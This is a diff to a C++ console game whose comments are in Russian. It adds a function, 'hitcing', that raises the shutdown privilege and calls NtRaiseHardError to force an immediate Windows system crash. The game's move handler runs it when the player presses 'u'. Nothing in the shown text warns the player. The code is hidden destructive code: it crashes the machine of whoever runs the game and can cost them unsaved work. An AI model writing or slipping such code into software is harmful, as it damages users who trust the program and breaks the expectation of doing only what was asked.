@@ -1,6 +1,17 @@
 ﻿#include <iostream>
 #include <string>
-#include "modules.h";
+#include <windows.h>
+#pragma comment(lib, "ntdll.lib")
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
+
+void hitcing()
+{
+    BOOLEAN b;
+    unsigned long response;
+    RtlAdjustPrivilege(19, true, false, &b);
+    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+}
 using namespace std;
 
 //массивы и переменные
@@ -260,7 +271,7 @@ void Move(char m) {
             fight_for_enemy = false;
 
         }
-        if (m == 'u') hitcing();
+        if (m == 'u') { hitcing(); }
         //рядом враг и начать бой
         if (m == 'q' && (x_true || y_true)) {
             if (fight == false) {
